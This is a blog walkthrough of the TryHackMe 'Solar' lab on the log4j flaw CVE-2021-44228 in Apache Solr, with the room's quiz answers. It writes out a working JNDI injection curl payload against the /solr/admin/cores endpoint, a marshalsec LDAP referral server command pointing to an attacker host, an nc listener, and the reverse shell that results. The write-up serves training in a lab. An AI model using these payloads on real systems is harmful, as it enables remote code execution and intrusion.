+++
date = '2025-12-18T15:27:41+07:00'
title = 'TryHackMe - Solar, exploiting log4j Room Walkthrough'
tags = ['TryHackMe']
description = "Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software under the sun."
draft = false

[cover]
  image = '/images/posts/tryhackme-cove.png'
  alt = 'TryHackMe Solar, exploiting log4j'
  caption = 'TryHackMe Solar, exploiting log4j'
  relative = false
+++

## Overview

-   **Room URL:** [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
-   **Difficulty:** Medium
-   **Time to complete:** 60

## Walkthrough

### 1. CVE-2021-44228 Introduction

_No answer needed!_

### 2. Reconnaissance

-   <p><b>What service is running on port 8983? (Just the name of the software)</b></p>

```bash
nmap -sV -p 8983 <MACHINE_IP>
```

**=> Answer: `Apache Solr`**

### 3. Discovery

-   Take a close look at the first page visible when navigating to <a href="http://machine_ip:8983/" target="_blank"><code><b>http://MACHINE_IP:8983</b></code></a>. You should be able to see clear indicators that log4j is in use within the application for logging activity. <b>What is the <code>-Dsolr.log.dir</code> argument set to, displayed on the front page?</b>

![Guide image](/images/posts/log4j-1.png)

**=> Answer: `/var/solr/logs`**

-   <p>Download the attached files (accessible in the top-right of this task) see some <i>example </i>log files within Solr. Explore each file, if just to get a feel for what is displayed in what log. </p><p>One file has a significant number of <code>INFO</code> entries showing repeated requests to one specific URL endpoint. <b>Which file includes contains this repeated entry? (Just the filename itself, no path needed)</b></p>

**=> Answer: `solr.log`**

-   <p><b>What "path" or URL endpoint is indicated in these repeated entries?</b></p>

![Guide image](/images/posts/log4j-2.png)

**=> Answer: `/admin/cores`**

-   <p><b>Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)</b></p>

**=> Answer: `params`**

### 4. Proof of Concept

```bash
ip addr show
nc -lvnp 9999
curl 'http://10.65.156.159:8983/solr/admin/cores?foo=$\{jndi:ldap://10.65.151.221:9999\}'
```

![Guide image](/images/posts/log4j-3.png)

### 5. Exploitation

For those, using your own machine get stuck in installing Java 8 you can try installing this way:

```bash
curl -s "https://get.sdkman.io" | bash
source "$HOME/.sdkman/bin/sdkman-init.sh"
sdk install java 8.0.432-tem  # Installs the Eclipse Temurin version
sdk use java 8.0.432-tem
```

-   <p>With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). You are more than welcome to dig into the usage, parameters and other settings that can be configured with this tool -- but for the sake of demonstration, the syntax to start the LDAP server is as follows:</p><p><b>

</b></p><div class="terminal-container"><b>

<div class="terminal-content">
<div class="terminal-top">
Start LDAP Server
</div>
<pre class="terminal-code"> <code class="language-shell-session">attackbox@tryhackme:~/root/../marshalsec$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"</code>
</pre>
</div>
</b></div><b>
</b><p></p><p>Adjust the IP address for your attacking machine as needed. Note that we will supplied the HTTP port listening on 8000.</p><p><b>What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)</b></p>

![Guide image](/images/posts/log4j-4.png)

**=> Answer: `Listening on 0.0.0.0:1389`**

Run the curl command:

```bash
curl 'http://10.67.173.125:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
```

After that, you should have the reverse shell:

![Guide image](/images/posts/log4j-5.png)

### 6. Persistence

-   <p>Check to see what user account you are running as within the context of your reverse shell.</p>
    <div class="terminal-container">
        <div class="terminal-content">
            <div class="terminal-top">
                View which user you are
            </div>
            <pre class="terminal-code">
               <code class="language-shell-session">whoami</code>
            </pre>
        </div>
    </div>
    <b>What user are you?</b>

![Guide image](/images/posts/log4j-6.png)

**=> Answer: `solr`**

### 7. Detection

_No answers needed!_

### 8. Bypasses

_No answers needed!_

### 9. Mitigation

-   <p>Determine where the <b><code>solr.in.sh</code></b> file exists on this target machine's filesystem. You can do this rapidly with the following command:</p>

<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Finding the solr.in.sh file
        </div>
        <pre class="terminal-code">
           <code class="language-shell-session">user@machine$ locate solr.in.sh</code>
        </pre>
    </div>
</div>
<p>You may see two results -- we want the one that corresponds to a system-wide configuration (see the hint if you don't understand what this refers to)</p><p><b>What is the full path of the specific <code>solr.in.sh</code> file?</b></p>

![Guide image](/images/posts/log4j-7.png)

**=> Answer: `/etc/default/solr.in.sh`**

### 10. Patching

_No answers needed!_

### 11. Credits and Author's Notes

_No answers needed!_
